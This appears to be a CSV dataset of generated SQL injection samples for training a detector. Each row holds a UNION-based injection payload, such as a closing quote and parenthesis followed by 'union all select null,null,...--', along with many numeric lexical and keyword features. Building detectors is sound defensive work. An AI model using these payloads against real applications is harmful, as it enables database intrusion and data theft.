id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000106,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.5730008443692163,68.08963775634766,25.14502716064453,16.176620483398438,11.667851448059082,-0.06554640829563141,29.632648468017578,10.660951614379883,0.9866750836372375,0.33844566345214844,0.32073649764060974,0.18764430284500122,0.13874514400959015,3.6663222312927246,0.26226216554641724,0.4521169066429138,1.8243671655654907,0.40900275111198425,0.05187119171023369,0.058198392391204834,0.08541839569807053,1.1582204103469849,4.677037715911865,0.010806902311742306,0.2701421082019806,0.310778945684433,0.018703214824199677,0.09683826565742493,0.07115491479635239,0.17049825191497803,0.3069569170475006,-0.22983279824256897,-0.004166029393672943,-0.06595872342586517,0.995082676410675,0.4383801519870758,0.03438503295183182,0.05559677258133888,1.1223609447479248,0.9334197640419006,0.455370157957077,0.0023279362358152866,0.04311291128396988,0.06270027905702591,0.05077403038740158,-0.35353851318359375,-0.06449897587299347,0.15682969987392426,0.18169547617435455,0.19626089930534363,-0.2265351265668869,-0.3617658019065857,-0.04442620277404785,0.1581631898880005,-0.07754968106746674,-0.09271762520074844,0.05450979247689247,-0.030036067590117455,-0.1373831331729889,0.1525488942861557,0.07426252216100693,-0.100365549325943,-0.07745455950498581,-0.02375292219221592,0.3387863337993622,0.015186145901679993,-0.01754678413271904,0.12201054394245148,0.09593811631202698,0.14994284510612488,0.1334504783153534,-0.1555584967136383,0.16663973033428192,-0.08418217301368713,0.35045215487480164,0.13417518138885498,0.024633703753352165,0.039368562400341034,-0.1822282373905182,0.24371570348739624,0.13519015908241272,2.462026596069336,0.09460964053869247,1.1160643100738525,0.11252349615097046,0.17477822303771973,0.11157029867172241,-0.1426277905702591,0.00029993310454301536
GAN_000107,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5323630689858376,67.7780990600586,22.213712692260742,17.81699562072754,11.977561950683594,-0.14526189863681793,31.75444984436035,10.747393608093262,1.0802313089370728,0.31450021266937256,0.288261741399765,0.16497528553009033,0.14612573385238647,3.6441614627838135,0.4687569737434387,0.376219242811203,1.7500600814819336,0.40906447172164917,-0.2807358205318451,0.08844905346632004,0.04171097278594971,1.1743452548980713,5.261906623840332,0.014158918522298336,0.2647929787635803,0.13444744050502777,-0.04713056609034538,0.09701754152774811,-0.02835804596543312,0.17620432376861572,0.2692908048629761,-0.08045074343681335,-0.07017496973276138,0.1404050588607788,1.0051106214523315,0.3429800271987915,0.02101190760731697,-0.09154599905014038,1.0286331176757812,1.1191149950027466,0.47114473581314087,0.08636648952960968,0.10314780473709106,-0.13505685329437256,0.1687159240245819,0.048702340573072433,-0.20774680376052856,0.053285084664821625,0.02975119650363922,0.10154873132705688,-0.4491932690143585,-0.03307611122727394,-0.003181539475917816,-0.08029675483703613,-0.04045415297150612,-0.18718257546424866,-0.04876111075282097,0.036430250853300095,0.028409883379936218,0.027936074882745743,-0.05745352804660797,0.24537771940231323,-0.013620235025882721,-0.04456406459212303,0.06800660490989685,-0.009379439055919647,-0.1315920203924179,0.13296443223953247,0.15251252055168152,-0.014401890337467194,-0.05645623058080673,-0.1215861365199089,0.1292215883731842,0.19780120253562927,0.1395711451768875,0.23950031399726868,0.017501220107078552,-0.02688300982117653,-0.19765013456344604,0.16207468509674072,0.022889282554388046,2.9100043773651123,0.09800899028778076,1.2289493083953857,-0.2062498778104782,-0.0977896898984909,-0.13379493355751038,0.3807683289051056,-0.009847847744822502
GAN_000108,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4421284782529105,67.87260437011719,26.36716079711914,16.465181350708008,11.355938911437988,-0.10367532074451447,28.814945220947266,11.010395050048828,1.1438528299331665,0.3214855194091797,0.2999315857887268,0.16227880120277405,0.14427953958511353,3.6376874446868896,0.4791233241558075,0.3894050419330597,1.9075126647949219,0.3407171070575714,-0.104612797498703,0.042764414101839066,0.11621692776679993,1.2139511108398438,5.242547512054443,0.01305319368839264,0.2490731030702591,-0.004223072901368141,0.009082467295229435,0.06716632097959518,-0.013159338384866714,0.1886170506477356,0.20555263757705688,-0.03383016586303711,0.06102759763598442,0.26481127738952637,1.0288702249526978,0.3091314435005188,0.007440735120326281,-0.01671723462641239,1.1078267097473145,1.1091713905334473,0.5072421431541443,0.054742444306612015,0.09432080388069153,-0.08754115551710129,0.03923187404870987,-0.022412016987800598,-0.2081923484802246,0.014878986403346062,0.0791330561041832,0.16591809689998627,-0.6164044737815857,-0.17753197252750397,-0.00970333069562912,-0.02059170976281166,-0.006585102062672377,-0.3924409747123718,-0.012615848332643509,-0.23475055396556854,0.1967795193195343,0.1444396674633026,-0.10005208849906921,-0.0010033175349235535,0.07601647078990936,-0.11567050963640213,0.17741063237190247,-0.03809810429811478,0.05988139659166336,-0.020759493112564087,0.09322602301836014,0.06402939558029175,0.09724106639623642,-0.06453225016593933,0.2670809030532837,0.11659650504589081,0.23053769767284393,0.16781222820281982,0.02132808044552803,0.013214192353188992,-0.2970810830593109,0.0597088560461998,0.058832183480262756,2.6507787704467773,0.10078322142362595,1.1269946098327637,-0.06789764761924744,0.014132246375083923,-0.004930239170789719,0.14681006968021393,-0.0022297801915556192
GAN_000109,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.3705609539178583,68.89588928222656,26.134504318237305,17.622638702392578,11.637344360351562,0.12974689900875092,28.997034072875977,10.512494087219238,0.9645581841468811,0.3643147349357605,0.2675541937351227,0.1764020472764969,0.14314259588718414,3.673710823059082,0.44867104291915894,0.3475605845451355,1.7710033655166626,0.332330584526062,-0.02798953466117382,0.06240218132734299,0.11110960692167282,1.1789731979370117,5.100937366485596,0.0170882698148489,0.29998162388801575,0.18299752473831177,0.036891382187604904,0.1364332139492035,0.03701631352305412,0.1905362457036972,0.21177273988723755,-0.0806344747543335,-0.05559360235929489,0.03818861022591591,1.0033531188964844,0.452640175819397,0.05635145306587219,0.008805071003735065,1.1175428628921509,0.9298058152198792,0.5054539442062378,0.10109732300043106,0.08809807896614075,-0.10611554235219955,0.09148203581571579,-0.06845611333847046,-0.1919952630996704,0.00973239354789257,0.07582112401723862,0.10305677354335785,-0.28206107020378113,-0.14087416231632233,-0.05901806801557541,0.027736760675907135,0.020531844347715378,-0.147301584482193,-0.048783134669065475,-0.032447539269924164,0.009523570537567139,0.14532294869422913,0.026725880801677704,0.05084645748138428,-0.02908613532781601,-0.07305344939231873,0.15540443360805511,0.06911338865756989,-0.08378008008003235,0.01540808379650116,0.05319987237453461,0.04606219381093979,0.004576578736305237,-0.15868936479091644,0.08267935365438461,-0.006743088364601135,0.12907354533672333,0.17569440603256226,0.017905844375491142,0.016857020556926727,-0.08155548572540283,0.09507790952920914,0.02551647275686264,2.8310365676879883,0.09629194438457489,1.1277384757995605,-0.008261606097221375,0.06301185488700867,-0.06522880494594574,0.0897083580493927,0.0016624010168015957
GAN_000110,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.7103984889539148,67.57272338867188,23.499313354492188,16.321460723876953,11.509593963623047,-0.06551451981067657,34.050750732421875,10.900579452514648,0.6534039378166199,0.3124394416809082,0.2717350125312805,0.17072400450706482,0.1411835104227066,3.7113535404205322,0.3235408663749695,0.4786425232887268,1.71792733669281,0.27130135893821716,0.011272924020886421,0.02775654010474682,0.0953170657157898,1.3718382120132446,5.02836799621582,0.02364293858408928,0.16931770741939545,0.2667925953865051,0.011983298696577549,0.010995541699230671,0.012947123497724533,0.19394424557685852,0.20397605001926422,-0.10643251240253448,-0.0658685490489006,-0.020327653735876083,1.0180106163024902,0.2540381848812103,0.027726858854293823,-0.016770342364907265,1.0496019124984741,0.9222606420516968,0.6076644659042358,0.09313205629587173,0.03757990524172783,-0.10852786153554916,0.2687022387981415,-0.1341206133365631,-0.055037982761859894,0.050224192440509796,0.3022814989089966,0.4725005328655243,-0.3478097915649414,-0.24063989520072937,0.14355725049972534,0.09219837933778763,-0.07308163493871689,-0.2956394553184509,-0.09140998125076294,-0.055152639746665955,0.09760339558124542,0.2240273654460907,0.07606490701436996,0.10328681021928787,-0.13060766458511353,-0.22760456800460815,0.13823354244232178,-0.010212663561105728,-0.3364805579185486,0.26972341537475586,0.13979798555374146,0.05168512091040611,-0.1889554262161255,-0.10898751020431519,0.24209024012088776,0.05061618983745575,0.08469276875257492,0.1130836009979248,0.02682732418179512,-0.04229706898331642,-0.16600510478019714,0.1436912715435028,-0.024874523282051086,2.614511013031006,0.14738094806671143,1.0061564445495605,-0.08454185724258423,0.05258575826883316,0.2093716263771057,0.2655213177204132,0.011969337239861488
GAN_000111,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.6485399062353765,66.69901275634766,22.544374465942383,18.275188446044922,11.943829536437988,-0.3467705547809601,30.967758178710938,11.180438041687012,1.07514488697052,0.2949386537075043,0.2995843291282654,0.15598073601722717,0.1455344259738922,3.6339519023895264,0.5625775456428528,0.3903915584087372,1.9127488136291504,0.4497431814670563,-0.2828747630119324,0.0900646522641182,0.08923599869012833,1.1973514556884766,5.5998663902282715,0.019367309287190437,0.17437031865119934,0.0968804806470871,-0.033098865300416946,0.06313955038785934,-0.017570268362760544,0.19296763837337494,0.24283938109874725,-0.14725711941719055,0.0015590563416481018,0.2758191227912903,1.0166150331497192,0.2939600944519043,0.0066979494877159595,-0.11053942143917084,1.0112439393997192,1.0581669807434082,0.5705409646034241,0.04683205857872963,0.17690834403038025,-0.12996327877044678,0.29250410199165344,-0.08869482576847076,-0.1228349357843399,-0.04968354105949402,0.14509236812591553,0.2661021947860718,-0.6409109830856323,-0.06327316164970398,0.19174855947494507,-0.15794138610363007,-0.18728792667388916,-0.3100956678390503,0.12527671456336975,-0.0074699632823467255,-0.009061165153980255,0.10343361645936966,-0.04010818898677826,0.18589076399803162,0.024607278406620026,-0.0702676773071289,0.0060670096427202225,0.12085850536823273,-0.11320848762989044,0.04086409509181976,0.08160216361284256,0.03257548809051514,-0.2454768419265747,-0.25040748715400696,0.12837859988212585,0.20951274037361145,0.04806087538599968,0.25122779607772827,0.0251091830432415,-0.057399798184633255,-0.34779101610183716,0.24639257788658142,-0.07619208097457886,2.9029340744018555,0.11413950473070145,1.204759120941162,-0.329892098903656,-0.032651275396347046,-0.06528645008802414,0.43542948365211487,-0.009807414375245571
GAN_000112,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.399817147339382,68.45748901367188,23.767887115478516,18.90024757385254,12.188156127929688,-0.2762972414493561,29.222890853881836,10.772603034973145,1.1521493196487427,0.2927515506744385,0.30103200674057007,0.1757420152425766,0.14706555008888245,3.5748579502105713,0.5067978501319885,0.5494427680969238,2.094249725341797,0.44814959168434143,-0.14914318919181824,0.06533171236515045,0.03137795627117157,1.2563223838806152,5.30015230178833,0.017041107639670372,0.23321977257728577,0.16010986268520355,-0.006280656438320875,0.06559539586305618,0.01528942957520485,0.17740212380886078,0.23575133085250854,0.08844494819641113,-0.10112503916025162,0.24856536090373993,1.0079033374786377,0.2900361120700836,0.002909597707912326,-0.09008936583995819,1.0162014961242676,1.0658828020095825,0.4329141676425934,0.046382833272218704,-0.048930928111076355,-0.09143806248903275,0.123853899538517,-0.14606411755084991,-0.2634861469268799,0.12094209343194962,0.012037813663482666,0.11179244518280029,-0.5248958468437195,0.06683424115180969,-0.009881488978862762,0.18174117803573608,-0.17698170244693756,-0.149507075548172,0.1644621193408966,0.19436408579349518,0.06193001568317413,-0.24531695246696472,0.005606599152088165,0.16261914372444153,-0.1750415861606598,-0.10616344213485718,0.14961329102516174,-0.1123686134815216,0.023949556052684784,0.128819078207016,0.20228135585784912,0.2411266416311264,-0.06378287822008133,-0.21715515851974487,0.004015408456325531,0.27904146909713745,0.3726935386657715,0.2633131146430969,0.025130627676844597,-0.042112965136766434,-0.16124972701072693,0.02576151117682457,0.061925776302814484,2.7348830699920654,0.08221646398305893,1.1141096353530884,-0.2898262143135071,-0.07434426248073578,0.014983437955379486,0.3446024954319,-0.01827181689441204
GAN_000113,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.4975240831423875,68.16899871826172,25.031274795532227,19.929100036621094,11.019371032714844,0.2239183932542801,28.269638061523438,10.709086418151855,1.322895884513855,0.328756719827652,0.2920285165309906,0.18103058636188507,0.14239667356014252,3.5418620109558105,0.3152162432670593,0.49356934428215027,2.1767537593841553,0.4046320617198944,-0.05927645415067673,-0.004854182247072458,0.0855104848742485,1.222731113433838,5.378565311431885,0.022176990285515785,0.2629197835922241,0.22656996548175812,0.021261919289827347,0.15220922231674194,0.043014973402023315,0.13965937495231628,0.21372953057289124,0.014072000980377197,0.000988796353340149,0.15814197063446045,1.0098952054977417,0.4936057925224304,0.025878068059682846,-0.03673196956515312,1.0521503686904907,0.9561282992362976,0.5167887806892395,-0.0036617196165025234,-0.05981825292110443,-0.057731106877326965,0.06870419532060623,-0.15636767446994781,-0.3481828272342682,0.19226999580860138,0.21389944851398468,0.1306796669960022,-0.49182993173599243,-0.18496833741664886,-0.24029910564422607,0.24483776092529297,0.028955336660146713,-0.12168354541063309,0.15538230538368225,0.12892766296863556,0.003731846809387207,-0.17006611824035645,0.10915028303861618,0.2272215485572815,-0.16022983193397522,-0.09656091034412384,0.2786756455898285,-0.10038399696350098,0.15845584869384766,-0.10893990844488144,0.18223066627979279,0.13720263540744781,0.020084653049707413,-0.23414810001850128,0.021215233951807022,-0.014718681573867798,0.4384629726409912,0.2215992659330368,0.01826339401304722,-0.01235413271933794,0.033171433955430984,0.13348200917243958,-0.13723425567150116,2.578103542327881,0.046215567737817764,1.1845471858978271,-0.10324445366859436,0.04826151207089424,-0.10561002790927887,0.08298410475254059,-0.00916479341685772
GAN_000114,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.4584339844344814,68.27714538574219,25.202537536621094,18.371501922607422,11.181392669677734,0.06225089356303215,30.507251739501953,10.560062408447266,0.996284008026123,0.3373546004295349,0.2787701189517975,0.17430976033210754,0.1412554681301117,3.6974070072174072,0.4627932906150818,0.35951948165893555,1.6925048828125,0.3242276906967163,-0.14288747310638428,0.08621536195278168,0.09515932202339172,1.2014104127883911,4.957830429077148,0.012249886058270931,0.30236586928367615,0.14808128774166107,0.030607309192419052,0.17753033339977264,0.035004038363695145,0.16530390083789825,0.2627893090248108,-0.07057663798332214,-0.05139777809381485,0.1207507997751236,1.0004185438156128,0.43533629179000854,0.018996138125658035,-0.004221740178763866,1.0819883346557617,0.9236508011817932,0.524738609790802,0.11482983827590942,0.1013140007853508,-0.14057683944702148,0.11659202724695206,-0.045062899589538574,-0.16308999061584473,0.15029214322566986,0.06300847232341766,0.11515185236930847,-0.2094501554965973,-0.06790269166231155,-0.12244772166013718,0.035188741981983185,0.045332103967666626,-0.10550951212644577,-0.025765907019376755,0.0517258457839489,-0.0011445507407188416,0.1889173686504364,0.017323441803455353,0.1684366762638092,-0.07302794605493546,-0.06081920862197876,0.2351451963186264,0.09216922521591187,-0.11025546491146088,0.04163210093975067,0.05646190792322159,-0.07818368077278137,-0.004853636026382446,-0.2289554625749588,0.09819047898054123,0.017950229346752167,0.0746791660785675,0.1912526786327362,0.01753237284719944,-0.009394039399921894,-0.20739048719406128,0.01123158447444439,-0.0219845250248909,2.6961371898651123,0.09018765389919281,1.2558294534683228,-0.09234817326068878,-0.01511065661907196,-0.1275901198387146,-0.015321195125579834,0.000597775389906019
GAN_000115,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.6087853326287624,66.64111328125,23.187822341918945,15.964104652404785,11.650557518005371,-0.8156744241714478,31.94399642944336,11.174873352050781,0.8741573095321655,0.31105244159698486,0.3190684914588928,0.1748773455619812,0.14274439215660095,3.6493656635284424,0.448660284280777,0.4857346713542938,1.7941477298736572,0.3577425479888916,-0.026366788893938065,0.10228627175092697,0.08695220202207565,1.3015373945236206,5.575759410858154,0.01827205717563629,0.17857100069522858,0.0997433066368103,-0.030048813670873642,-0.011014084331691265,-0.01982303336262703,0.18095019459724426,0.24915336072444916,-0.08275847136974335,-0.20654791593551636,0.11163486540317535,1.0154788494110107,0.2549827992916107,-0.011272433213889599,-0.05863069370388985,1.0405361652374268,1.1806590557098389,0.4955877959728241,0.006545084062963724,-0.11307704448699951,-0.04978509992361069,0.11970195919275284,-0.14176537096500397,-0.11320850998163223,0.15281561017036438,0.13634979724884033,0.3135315775871277,-0.6177770495414734,-0.2420826256275177,0.03475923836231232,0.006506532430648804,-0.17397287487983704,-0.4663723409175873,-0.073489248752594,-0.04317546635866165,0.19842767715454102,0.1270628273487091,0.01793784648180008,0.10979583114385605,-0.13390955328941345,-0.13979190587997437,0.08281375467777252,0.005521610379219055,-0.17237283289432526,0.26927274465560913,0.10624799877405167,0.15913909673690796,0.01913374289870262,-0.07460762560367584,0.33425700664520264,0.18157437443733215,0.3228365480899811,0.1253458857536316,0.03576714172959328,-0.012024407275021076,-0.2817758023738861,0.1391298472881317,0.008743688464164734,2.371694803237915,0.144370898604393,1.09709894657135,-0.2077137976884842,-0.028219074010849,0.13192212581634521,0.35524049401283264,-0.008237889967858791
GAN_000116,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.6897320890300382,68.29464721679688,24.78679847717285,15.910338401794434,11.502877235412598,-0.0994078665971756,32.18034744262695,10.760250091552734,0.9370841979980469,0.3195154666900635,0.29968973994255066,0.16932633519172668,0.14348013699054718,3.6595685482025146,0.3879741430282593,0.44073858857154846,1.6662942171096802,0.3286811113357544,-0.11837558448314667,0.018345383927226067,0.09451333433389664,1.1351717710494995,4.767454624176025,0.013090345077216625,0.2862315773963928,0.1804896742105484,0.024310413748025894,0.03802511468529701,-0.027482960373163223,0.22155122458934784,0.2711946666240692,-0.13090738654136658,-0.09832087904214859,0.04217112809419632,1.0004826784133911,0.37392112612724304,0.02475103735923767,-0.03375014290213585,1.0705299377441406,1.0830016136169434,0.5321863293647766,0.05903633311390877,0.03014637529850006,-0.0656222328543663,0.21229711174964905,-0.12241858243942261,-0.1802741140127182,-0.03251432254910469,0.038171082735061646,0.32098153233528137,-0.48023056983947754,-0.18251855671405792,-0.01179584115743637,0.15538951754570007,0.06160649284720421,-0.3574672043323517,-0.10481347143650055,-0.18646234273910522,0.24937230348587036,0.24419516324996948,-0.02116774022579193,0.04488139599561691,-0.009412415325641632,-0.1610049456357956,0.09819233417510986,0.005662295967340469,-0.1414109170436859,0.2747652530670166,0.07845930010080338,0.04165687784552574,0.02798600122332573,0.03919116407632828,0.2420915961265564,0.1198355108499527,0.31854480504989624,0.1331685185432434,0.021548815071582794,0.02465360425412655,-0.27952224016189575,0.023280125111341476,0.16189226508140564,2.7659337520599365,0.13383851945400238,1.203372597694397,0.13361883163452148,-0.023305997252464294,0.04543813690543175,0.28764665126800537,0.005669362843036652
GAN_000117,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.414664813803367,67.52709197998047,27.5054988861084,16.3966007232666,10.945688247680664,-0.17112107574939728,26.641244888305664,10.83169937133789,1.27743399143219,0.3026887774467468,0.3056069612503052,0.18064382672309875,0.14180618524551392,3.5327329635620117,0.390922486782074,0.5092493891716003,2.1901116371154785,0.3211705982685089,-0.03163328394293785,0.034007806330919266,0.08134883642196655,1.1998275518417358,5.523886680603027,0.01619112491607666,0.17182573676109314,0.09603565186262131,0.013274372555315495,0.08165936172008514,0.034403495490550995,0.13414312899112701,0.22428296506404877,0.10821473598480225,-0.04466693103313446,0.3121882975101471,1.0259970426559448,0.26175668835639954,-0.00918386410921812,-0.021967688575387,1.0315645933151245,1.0463916063308716,0.48533403873443604,-0.004134622868150473,-0.039239585399627686,-0.06642267853021622,-0.0020316913723945618,-0.28803861141204834,-0.22341568768024445,0.1515912413597107,0.053769685328006744,0.11641508340835571,-0.6654783487319946,-0.16110821068286896,-0.09987644106149673,0.22865867614746094,-0.08208957314491272,-0.28951799869537354,0.22567452490329742,-0.044399745762348175,0.14450305700302124,-0.06754336506128311,-0.02727644145488739,0.12229261547327042,-0.11007409542798996,-0.12524202466011047,0.3286263942718506,-0.025562502443790436,0.16387099027633667,0.014714628458023071,0.16424845159053802,0.15184643864631653,0.08959642052650452,-0.3817438781261444,0.01913692057132721,0.08494403213262558,0.3917151093482971,0.18890979886054993,0.028804564848542213,-0.01607905700802803,-0.21081897616386414,-0.07370679080486298,-0.006829597055912018,2.3057429790496826,0.09439302980899811,1.1191074848175049,-0.22553043067455292,0.13115596771240234,0.10525023937225342,0.15030711889266968,-0.012108420953154564
GAN_000118,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5648778187784993,67.77824401855469,24.690919876098633,17.38738441467285,11.878676414489746,-0.10740859806537628,31.959104537963867,10.729530334472656,0.9205103516578674,0.3229820728302002,0.2661904990673065,0.16321386396884918,0.14386671781539917,3.6803696155548096,0.45412254333496094,0.42604172229766846,1.76667058467865,0.32804250717163086,-0.13268445432186127,0.06586386263370514,0.07676047086715698,1.1906145811080933,5.283422470092773,0.014311876147985458,0.24395577609539032,0.14295803010463715,0.01077940408140421,0.09691546857357025,-0.02261568233370781,0.20571136474609375,0.24359746277332306,-0.15450456738471985,-0.04430945962667465,0.11275710165500641,1.0046863555908203,0.3701600134372711,0.021517273038625717,-0.04889797046780586,1.046805500984192,1.0034961700439453,0.5069329142570496,0.09900694340467453,0.12305271625518799,-0.07714555412530899,0.20910194516181946,-0.02435566484928131,-0.1625625640153885,0.08634500205516815,0.08476566523313522,0.25493258237838745,-0.34216952323913574,-0.06266769766807556,0.008066661655902863,0.012051738798618317,-0.05601052567362785,-0.2369127869606018,0.005897365510463715,-0.11365090310573578,-0.017349056899547577,0.19265946745872498,-0.007955566048622131,0.1753992736339569,-0.06114747375249863,-0.12815499305725098,0.1098889708518982,-0.012163136154413223,-0.21593576669692993,0.12616674602031708,0.16521033644676208,0.02035149186849594,-0.04113508015871048,-0.07510122656822205,0.1579437404870987,0.11569473892450333,0.2337287962436676,0.17447832226753235,0.018478337675333023,-0.027022268623113632,-0.16521582007408142,0.12000682204961777,-0.017251580953598022,2.7785298824310303,0.1174934059381485,1.1944973468780518,-0.1379564106464386,0.056516099721193314,-0.026412252336740494,0.30509576201438904,0.003580727381631732
GAN_000119,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,3.5739799919525512,68.44342803955078,22.203462600708008,19.506919860839844,11.542976379394531,-0.6692521572113037,31.233476638793945,11.060419082641602,1.0516488552093506,0.29970335960388184,0.3219895362854004,0.1624804586172104,0.1503133475780487,3.59389066696167,0.626632809638977,0.4005814790725708,1.9071776866912842,0.5156348347663879,-0.2082468718290329,0.15136712789535522,0.0472298339009285,1.1427996158599854,5.475152492523193,0.008435482159256935,0.24858057498931885,0.17943109571933746,-0.06911163777112961,0.1024058610200882,0.022455599159002304,0.20262107253074646,0.259975403547287,-0.26808059215545654,0.06562521308660507,0.3309434652328491,0.9900051951408386,0.4198504686355591,-0.002478736685588956,-0.0966353565454483,1.0494345426559448,1.0727317333221436,0.46404027938842773,0.024887384846806526,0.13664674758911133,-0.0916377529501915,0.21835198998451233,0.0869734138250351,-0.11013979464769363,0.1307152658700943,-0.018499180674552917,0.17860910296440125,-0.335873007774353,0.05686092749238014,0.009516417980194092,-0.19627347588539124,-0.2228405475616455,-0.1075940951704979,-0.010828319936990738,0.24748820066452026,-0.0796852633357048,-0.03455793857574463,-0.03583226725459099,0.25249096751213074,0.007422782480716705,0.14204645156860352,0.0699780136346817,-0.015228722244501114,-0.006545506417751312,0.17195118963718414,0.1507822722196579,0.09452996402978897,-0.027832962572574615,-0.17770478129386902,0.1100461483001709,0.22362706065177917,0.24151462316513062,0.27354252338409424,0.02019953727722168,-0.043412189930677414,-0.24210023880004883,0.22137242555618286,0.0718374103307724,2.8962044715881348,0.10319089889526367,1.2582836151123047,-0.2848076820373535,0.007671043276786804,-0.16820330917835236,0.3411649465560913,-0.015424063429236412
GAN_000120,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.739780951129307,68.09899139404297,26.053401947021484,14.992969512939453,10.613362312316895,-0.12123830616474152,29.81373405456543,10.914225578308105,1.0677121877670288,0.3249662220478058,0.27216655015945435,0.17386598885059357,0.14365561306476593,3.6141440868377686,0.41726022958755493,0.3834172785282135,1.7382409572601318,0.3505214750766754,-0.22824552655220032,0.051483843475580215,0.13374346494674683,1.0078210830688477,4.889742851257324,0.01877995766699314,0.22834591567516327,0.24679654836654663,0.0592469647526741,0.09788691252470016,-0.06758728623390198,0.13729405403137207,0.19822968542575836,-0.021737612783908844,-0.10626759380102158,0.09716778993606567,1.0078883171081543,0.3264163136482239,0.008542542345821857,-0.04892680421471596,1.133782148361206,1.0774006843566895,0.5950024127960205,0.0879746824502945,0.15019693970680237,-0.11889427155256271,0.27186885476112366,-0.128682941198349,-0.23313778638839722,0.05846022069454193,-0.15016409754753113,0.16388705372810364,-0.4018077552318573,0.002580141881480813,-0.03767037391662598,0.14478549361228943,0.07667328417301178,-0.4605518877506256,-0.04057395085692406,-0.16516394913196564,0.14137321710586548,0.2435368299484253,-0.06941165030002594,0.043616779148578644,-0.25163859128952026,-0.07988379895687103,0.462384432554245,0.10800647735595703,0.005304992198944092,0.2025911659002304,0.046911679208278656,-0.17454645037651062,0.08113405108451843,-0.257072776556015,0.051399264484643936,-0.01021265983581543,0.2720426619052887,0.19454187154769897,0.001279490883462131,-0.043128106743097305,-0.2092609405517578,0.05318872630596161,0.02001368999481201,2.7571511268615723,0.11617490649223328,1.111664056777954,-0.14284101128578186,0.17630350589752197,-0.048315152525901794,0.12853701412677765,-0.0007435775478370488
